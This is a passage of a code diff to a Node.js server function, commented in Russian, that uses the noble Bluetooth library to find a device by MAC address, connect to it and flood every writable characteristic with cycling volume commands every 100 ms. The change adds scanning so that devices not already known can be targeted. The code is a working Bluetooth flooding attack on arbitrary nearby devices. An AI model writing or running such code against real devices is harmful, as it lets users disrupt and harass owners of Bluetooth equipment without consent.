@@ -558,15 +558,54 @@ function floodVolumeCommands(mac, res) {
   try {
     console.log(`Starting flood volume commands for ${mac}...`);
     
-    // Сначала подключаем устройство
     const noble = require("@abandonware/noble");
     let peripheral = noble._peripherals[mac];
     
     if (!peripheral) {
-      return res.status(404).json({ 
-        error: "Peripheral not found", 
-        message: "Device not found in noble peripherals" 
-      });
+      console.log(`Device ${mac} not in _peripherals, starting scan...`);
+      
+      let scanTimeout;
+      let found = false;
+      
+      const onDiscover = (p) => {
+        if (p.address.toLowerCase() === mac) {
+          found = true;
+          peripheral = p;
+          clearTimeout(scanTimeout);
+          noble.removeListener('discover', onDiscover);
+          noble.stopScanning();
+          console.log(`Found target device ${mac}, starting flood...`);
+          startFloodSession();
+        }
+      };
+      
+      scanTimeout = setTimeout(() => {
+        noble.removeListener('discover', onDiscover);
+        noble.stopScanning();
+        if (!found) {
+          return res.status(404).json({ 
+            error: "Peripheral not found", 
+            message: `Device ${mac} not found after 5 seconds of scanning` 
+          });
+        }
+      }, 5000);
+      
+      noble.on('discover', onDiscover);
+      
+      if (noble.state === 'poweredOn') {
+        noble.startScanning([], true);
+        console.log('Started scanning for flood target device');
+      } else {
+        clearTimeout(scanTimeout);
+        noble.removeListener('discover', onDiscover);
+        return res.status(500).json({ 
+          error: "Bluetooth not powered on", 
+          message: `Bluetooth state: ${noble.state}` 
+        });
+      }
+    } else {
+      console.log(`Device ${mac} found in _peripherals, starting flood...`);
+      startFloodSession();
     }
 
     const floodCommands = [
@@ -605,59 +644,61 @@ function floodVolumeCommands(mac, res) {
     let isConnected = false;
     let writableCharacteristics = [];
 
-    // Функция для запуска флуда
-    function startFlood() {
-      console.log(`Starting flood with ${floodCommands.length} commands for 10 seconds...`);
-      
-      floodInterval = setInterval(() => {
-        if (commandIndex >= floodCommands.length) {
-          commandIndex = 0; // Зацикливаем команды
-        }
-
-        const cmd = floodCommands[commandIndex];
+    function startFloodSession() {
+      // Функция для запуска флуда
+      function startFlood() {
+        console.log(`Starting flood with ${floodCommands.length} commands for 10 seconds...`);
         
-        // Пишем во все writable характеристики
-        writableCharacteristics.forEach((char, index) => {
-          const useWithoutResponse = char.properties.includes('writeWithoutResponse');
-          
-          try {
-            char.write(cmd, useWithoutResponse, (error) => {
-              if (error) {
-                console.error(`Flood command ${commandIndex} failed on char ${index}:`, error.message);
-              } else {
-                console.log(`Flood command ${commandIndex} (${cmd.toString('hex')}) sent to ${char.uuid}`);
-              }
-            });
-          } catch (err) {
-            console.error(`Error writing to characteristic ${char.uuid}:`, err.message);
+        floodInterval = setInterval(() => {
+          if (commandIndex >= floodCommands.length) {
+            commandIndex = 0; // Зацикливаем команды
           }
-        });
-        
-        commandIndex++;
-      }, 100); // Каждые 100мс новая команда
-    }
 
-    // Подключаемся к устройству
-    if (peripheral.state === 'connected') {
-      isConnected = true;
-      console.log(`Device ${mac} already connected`);
-      return prepareDevice();
-    }
-
-    console.log(`Connecting to ${mac}...`);
-    peripheral.connect((error) => {
-      if (error) {
-        console.error(`Failed to connect to ${mac}:`, error);
-        return res.status(500).json({ 
-          error: "Connection failed", 
-          message: `Failed to connect to ${mac}: ${error.message}` 
-        });
+          const cmd = floodCommands[commandIndex];
+          
+          // Пишем во все writable характеристики
+          writableCharacteristics.forEach((char, index) => {
+            const useWithoutResponse = char.properties.includes('writeWithoutResponse');
+            
+            try {
+              char.write(cmd, useWithoutResponse, (error) => {
+                if (error) {
+                  console.error(`Flood command ${commandIndex} failed on char ${index}:`, error.message);
+                } else {
+                  console.log(`Flood command ${commandIndex} (${cmd.toString('hex')}) sent to ${char.uuid}`);
+                }
+              });
+            } catch (err) {
+              console.error(`Error writing to characteristic ${char.uuid}:`, err.message);
+            }
+          });
+          
+          commandIndex++;
+        }, 100); // Каждые 100мс новая команда
       }
 
-      isConnected = true;
-      console.log(`Successfully connected to ${mac}`);
-      prepareDevice();
-    });
+      // Подключаемся к устройству
+      if (peripheral.state === 'connected') {
+        isConnected = true;
+        console.log(`Device ${mac} already connected`);
+        return prepareDevice();
+      }
+
+      console.log(`Connecting to ${mac}...`);
+      peripheral.connect((error) => {
+        if (error) {
+          console.error(`Failed to connect to ${mac}:`, error);
+          return res.status(500).json({ 
+            error: "Connection failed", 
+            message: `Failed to connect to ${mac}: ${error.message}` 
+          });
+        }
+
+        isConnected = true;
+        console.log(`Successfully connected to ${mac}`);
+        prepareDevice();
+      });
+    }
 
     function prepareDevice() {
       // Находим все writable характеристики
